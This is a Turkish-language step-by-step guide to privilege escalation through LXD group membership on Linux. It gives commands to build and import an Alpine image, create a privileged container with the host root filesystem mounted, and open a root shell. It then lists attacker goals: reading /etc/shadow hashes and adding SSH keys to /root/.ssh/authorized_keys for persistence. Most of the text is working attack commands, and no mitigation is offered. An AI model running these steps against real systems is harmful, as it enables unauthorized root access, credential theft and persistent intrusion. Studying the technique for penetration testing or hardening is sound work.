### LXD Privilege Escalation (Yetki Yükseltme) Rehberi

LXD, konteyner yönetimi için kullanılan bir araçtır. Sistemlerde yanlış yapılandırılmış LXD izinleri, saldırganların yetkilerini yükseltmesi için bir fırsat sunabilir. Bu rehberde, LXD’yi kullanarak yetki yükseltmenin nasıl gerçekleştirileceğini adım adım anlatacağız.

---

#### 1. **LXD’yi Tanıma**
LXD, konteyner tabanlı bir sanallaştırma çözümüdür. Sistem üzerinde bir kullanıcı LXD grubunun bir üyesiyse, konteynerler üzerinden root yetkisi kazanabilir. Bunu anlamak için şu komutu kullanabilirsiniz:
```bash
groups
```
Eğer `lxd` grubunda olduğunuzu görüyorsanız, bu grup üyeliği yetki yükseltme için kullanılabilir.

---

#### 2. **LXD Grubu Üyeliğini Kontrol Etme**
Aşağıdaki komutla kullanıcıların LXD grubuna üye olup olmadığını kontrol edebilirsiniz:
```bash
id
```
Örnek çıktı:
```
uid=1001(ahmet) gid=1001(ahmet) groups=1001(ahmet),110(lxd)
```
Bu çıktı, kullanıcının `lxd` grubunun bir üyesi olduğunu gösterir.

---

#### 3. **Yetki Yükseltme için Gereken Adımlar**

##### Adım 1: **Gerekli Araçları ve İmajları İndirin**
Yetki yükseltmek için bir LXD imajına ihtiyacınız var. Kali Linux gibi sistemlerde “alpine” imajı kullanılabilir.

1. Alpine imajını indirin:
```bash
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/alpine-builder
chmod +x alpine-builder
./alpine-builder
```
Bu işlem sonunda bir `alpine.tar.gz` dosyası oluşturulur.

##### Adım 2: **Kendi İmajınızı Yükleyin**
LXD ortamına indirdiğiniz imajı ekleyin:
```bash
lxc image import ./alpine.tar.gz --alias myimage
lxc image list
```
Bu komutlar, `myimage` adlı bir konteyner imajını oluşturacaktır.

##### Adım 3: **Konteyner Oluşturun ve Çalıştırın**
Yeni bir konteyner oluşturup çalıştırın:
```bash
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
```
Bu adımlarla konteyner, host dosya sistemine erişim sağlayacak şekilde yapılandırılmış olur.

##### Adım 4: **Konteyner’den Root Shell Elde Etme**
Konteynere bağlanarak root shell elde edebilirsiniz:
```bash
lxc exec mycontainer /bin/sh
```
Konteynerden host sisteminin kök dizinine erişmek için:
```bash
cd /mnt/root
```
Buradan sonra hassas dosyaları okuyabilir veya değiştirebilirsiniz.

---

#### 4. **Saldırı Senaryosu**
Bir saldırganın yukarıdaki adımları izleyerek neler yapabileceği:
1. `/etc/shadow` dosyasını okuyarak hash’leri ele geçirme.
2. `/root/.ssh/authorized_keys` dosyasını düzenleyerek kalıcı erişim sağlama.
3. Sistemdeki önemli yapılandırma dosyalarını değiştirme.

---

